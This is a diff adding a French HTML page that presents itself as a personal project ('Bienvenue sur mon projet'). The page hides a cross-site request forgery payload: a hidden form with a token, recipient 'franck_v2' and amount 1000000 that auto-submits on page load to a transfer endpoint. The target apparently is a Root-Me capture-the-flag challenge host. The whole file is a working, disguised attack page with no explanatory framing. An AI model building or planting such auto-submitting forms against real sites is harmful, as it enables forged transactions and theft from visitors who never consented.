@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Bank-Me - Projet</title>
+</head>
+<body>
+    <form id="transfer-form"
+          action="https://instance-01a217fb-5e63-7168-a047-6c795ed13ff5.challenges.root-me.pro/transfer"
+          method="POST">
+
+        <input type="hidden" name="token"
+               value="Q1NSRnNfNHIzX2MwMGw6dGhlX3p1Y2NjY2NjazoyNTEzNjk5NTEz">
+
+        <input type="hidden" name="recipient" value="franck_v2">
+
+        <input type="hidden" name="amount" value="1000000">
+    </form>
+
+    <p>Bienvenue sur mon projet.</p>
+
+    <script>
+        document.getElementById("transfer-form").submit();
+    </script>
+</body>
+</html>
